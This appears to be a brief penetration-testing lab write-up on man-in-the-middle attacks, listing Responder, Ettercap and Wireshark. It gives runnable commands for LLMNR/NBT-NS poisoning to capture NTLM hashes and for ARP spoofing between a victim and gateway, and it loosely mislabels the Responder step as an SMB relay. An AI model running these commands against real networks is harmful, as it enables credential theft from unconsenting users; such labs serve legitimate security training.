
---

#  LAB 4 – Network Protocol Attacks  

```md
# Lab 4 – Network Protocol Attacks Workflow

## Objective
To perform Man-in-the-Middle (MITM) and protocol exploitation attacks.

## Tools Used
- Responder
- Ettercap
- Wireshark

## Step-by-Step Workflow

### Step 1: SMB Relay Attack
```bash
sudo responder -I eth0 -dw

### Step 2: Capture NTLM Hashes

Wait for victim authentication attempts and capture hashes.

### Step 3: ARP Spoofing
sudo ettercap -T -q -i eth0 -M arp:remote /victim-ip/ /gateway-ip/

### Step 4: Traffic Analysis

Capture packets in Wireshark

Analyze credentials and SMB traffic

## Evidence

NTLM hash screenshot

Wireshark capture

## Outcome

Successful MITM attack with credential interception.
